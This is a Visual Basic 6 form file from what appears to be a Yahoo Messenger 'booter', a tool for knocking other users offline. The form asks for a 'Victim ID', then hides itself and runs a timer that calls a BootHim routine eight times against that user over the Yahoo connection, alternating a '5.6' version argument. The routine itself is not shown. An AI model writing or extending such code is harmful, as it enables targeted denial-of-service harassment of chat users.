VERSION 5.00
Begin VB.Form frmBoot 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Boot"
   ClientHeight    =   1530
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   3975
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   BeginProperty Font 
      Name            =   "Trebuchet MS"
      Size            =   9.75
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmBoot.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1530
   ScaleWidth      =   3975
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer tmrBoot 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   90
      Top             =   870
   End
   Begin VB.TextBox txtYahooID 
      Height          =   390
      Left            =   1170
      TabIndex        =   2
      Top             =   240
      Width           =   2655
   End
   Begin Yahoo.MyButton cmdOK 
      Default         =   -1  'True
      Height          =   375
      Left            =   600
      TabIndex        =   0
      Top             =   960
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   661
      BTYPE           =   5
      TX              =   "OK"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   1
      FOCUSR          =   0   'False
      BCOL            =   14933984
      BCOLO           =   14933984
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmBoot.frx":014A
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   1
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Yahoo.MyButton cmdCancel 
      Cancel          =   -1  'True
      Height          =   375
      Left            =   2010
      TabIndex        =   1
      Top             =   960
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   661
      BTYPE           =   5
      TX              =   "Cancel"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   1
      FOCUSR          =   0   'False
      BCOL            =   14933984
      BCOLO           =   14933984
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmBoot.frx":0166
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   1
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.Label Label1 
      Caption         =   "Victim ID:"
      Height          =   255
      Left            =   150
      TabIndex        =   3
      Top             =   330
      Width           =   1215
   End
End
Attribute VB_Name = "frmBoot"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim BootSequence As Integer
'

Private Sub cmdCancel_Click()
    Unload Me
End Sub

Private Sub cmdOK_Click()
    BootSequence = 1
    If Trim(txtYahooID) = "" Then Exit Sub
    tmrBoot.Enabled = True
    Me.Visible = False
End Sub

Private Sub Form_Load()
    BootSequence = 1
End Sub

Private Sub Form_Unload(Cancel As Integer)
    BootSequence = 0
End Sub

Private Sub tmrBoot_Timer()
    If (BootSequence Mod 2) = 1 Then
        BootHim txtYahooID, frmLogIn.sckYahoo
    Else
        BootHim txtYahooID, frmLogIn.sckYahoo, "5.6"
    End If
    BootSequence = BootSequence + 1
    If BootSequence > 8 Then
        tmrBoot.Enabled = False
        Unload Me
    End If
End Sub
